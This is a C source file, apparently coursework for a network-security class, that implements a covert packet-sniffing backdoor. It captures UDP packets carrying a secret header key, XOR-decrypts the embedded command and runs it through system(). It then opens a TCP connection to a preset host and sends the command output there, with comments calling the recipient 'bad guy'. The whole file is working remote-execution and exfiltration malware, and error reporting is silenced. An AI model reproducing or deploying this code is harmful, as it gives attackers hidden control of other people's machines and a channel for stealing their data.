#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "pkthandler.h"

/*------------------------------------------------------------------------------
-- FUNCTION: packet_handler
--
-- DATE:  June 1st 2010
--
-- REVISIONS: May 27th 2010 - Added the command exectution step -TJ
--
-- DESIGNER: 
--
-- PROGRAMMER:
--
-- SOURCE: COMP 8505 notes
--
-- INTERFACE:   void packet_handler(u_char *ptrnull, 
--              const struct pcap_pkthdr *pkt_info, const u_char *packet)
--
-- RETURNS: void
--
-- NOTES:
-- Callback for pcap loop. Handles packets that are captured. Will look for
-- packets that have the key pkt in the payload portion of the UDP packet.
-- These packets should have encrypted (XOR) commands that will be executed on
-- the machine the packet capture is being run on. Any results of the command
-- are sent back to a predetemined HOST and PORT defined in pkthandler.h.
------------------------------------------------------------------------------*/
void packet_handler(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, 
    const u_char *packet)
{
    int len, loop;
	char *ptr, *ptr2;
	char decrypt[MAX_SIZE];
	char command[MAX_SIZE];
    
	/* Step 1: locate the payload portion of the packet*/
	ptr = (char *)(packet + ETHER_IP_UDP_LEN);
	if ((pkt_info->caplen - ETHER_IP_UDP_LEN - 14) <= 0) 
		return;
    
	/* Step 2: check payload for backdoor header key*/
	if (0 != memcmp(ptr, BACKDOOR_HEADER_KEY, BACKDOOR_HEADER_LEN))
    {
		return;
    }
    
	ptr += BACKDOOR_HEADER_LEN;
	len = (pkt_info->caplen - ETHER_IP_UDP_LEN - BACKDOOR_HEADER_LEN);

	memset(decrypt, 0x0, sizeof(decrypt)); 
    
    //use only for unencryptedencrypted
    //strcpy(decrypt,ptr);
    
	/* Step 3: decrypt the packet by an XOR pass against contents*/
    //comment this step if packets are unencrypted
	for (loop = 0; loop < len; ++loop)
		decrypt[loop] = ptr[loop] ^ PASSWORD[(loop % PASSLEN)];    
    
	/* Step 4: verify decrypted contents */
	if ((ptr = strstr(decrypt, COMMAND_START)) == NULL)
    {
		return;
    }
	ptr += strlen(COMMAND_START);
	if ((ptr2 = strstr(ptr, COMMAND_END)) == NULL)
    {
		return;
    }
    
	/* Step 5: extract the remainder */
	memset(command, 0x0, sizeof(command));
	strncpy(command, ptr, (ptr2 - ptr));
 
	/* Step 6: Execute the command*/ 
    //add redirection to output file to command
    strncat(command," > .output 2>&1",sizeof(command)+10);
	system(command);
    
    //time to send back the output, but only if there is any to send back
    if(GetFileSize(FNAME) > 0)
        exfil();
    
    //Remove file
    system("rm -f .output");
    
	return;
}

/*------------------------------------------------------------------------------
-- FUNCTION: exfil
--
-- DATE: June 1st 2010
--
-- REVISIONS: 
--
-- DESIGNER: Tajinder Thind
--
-- PROGRAMMER: Tajinder Thind
--
-- INTERFACE: void exfil()
--
-- RETURNS: void
--
-- NOTES:
-- Opens a TCP connection to a predetermined HOST and PORT defined in 
-- pktheader.h. Then calls SendFile to send the .output file containing the
-- results from the last command executed.
------------------------------------------------------------------------------*/
void exfil()
{
    int sd,n;
    struct hostent *hp;
    struct sockaddr_in addr;
    FILE *fp;
    char buff[1024];

    //prepare connection
    if((sd  = socket(AF_INET, SOCK_STREAM,0)) == -1)
    {
        //perror("Can't create socket");
        return;
    }
    
    bzero((char *)&addr, sizeof(struct sockaddr_in));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(PORT);
	if ((hp = gethostbyname(HOST)) == NULL)
	{
		//perror("Unknown server address");
		return;
	}
    bcopy(hp->h_addr, (char *)&addr.sin_addr, hp->h_length);
    
    //connect
    if(connect(sd,(struct sockaddr *)&addr,sizeof(addr)) == -1)
    {
        //perror("error connecting\n");
        close(sd);
        return;
    }
    
    //read file and send to bad guy
    SendFile(FNAME,sd);
    
    //close socket
    shutdown(sd, SHUT_RDWR);
    close(sd);
}

/*------------------------------------------------------------------------------
-- FUNCTION: SendFile
--
-- DATE: Oct 4th 2009
--
-- REVISIONS: May 30th 2010 - zeroed the buffer before using due to issue with
--                            extra bytes being sent despite only the number
--                            bytes read being sent.
--
-- DESIGNER: Tajinder Thind
--
-- PROGRAMMER: Tajinder Thind
--
-- INTERFACE: int SendFile(char *filename, int sd)
--
-- RETURNS: int
--
-- NOTES:
-- Opens the filename specified, reads that file and sends it the server
------------------------------------------------------------------------------*/
int SendFile(char *filename, int sd)
{
	int fd;
	ssize_t bytesRead = 0;
	int totalBytes = 0;
	
	char buffer[BUFMAX];
	
	if((fd = open(filename, O_RDONLY)) == -1)
	{
		//perror("Error opening file");
		return 0;
	}
	
	while(1)
	{
        bzero(buffer,BUFMAX);
		bytesRead = read(fd, &buffer, BUFMAX);
        
        if(bytesRead == 0)
			break;

		if(send(sd, buffer, bytesRead, 0) == -1)
		{
			//perror("Error sending");
			return 0;
		}
		totalBytes += (int) bytesRead;
        
        
        bytesRead = 0;
	}
    close(fd);
	return totalBytes;
}

/*------------------------------------------------------------------------------
-- FUNCTION: GetFileSize
--
-- DATE: June 2nd 2010
--
-- REVISIONS:
--
-- DESIGNER: Tajinder Thind
--
-- PROGRAMMER: Tajinder Thind
--
-- INTERFACE: int GetFileSize(char* fname)
--
-- RETURNS: int
--
-- NOTES:
-- Retrives the filesize of the specified file name and returns the size.
------------------------------------------------------------------------------*/
int GetFileSize(char* fname)
{
    struct stat buf;
    
    int fd;
    
    if((fd = open(fname, O_RDONLY)) == -1)
	{
		//perror("Error opening file\n");
		return 0;
	}
    
    if(fstat(fd,&buf) < 0)
    {
        //perror("Fstat");
    }
    
    return buf.st_size;
}
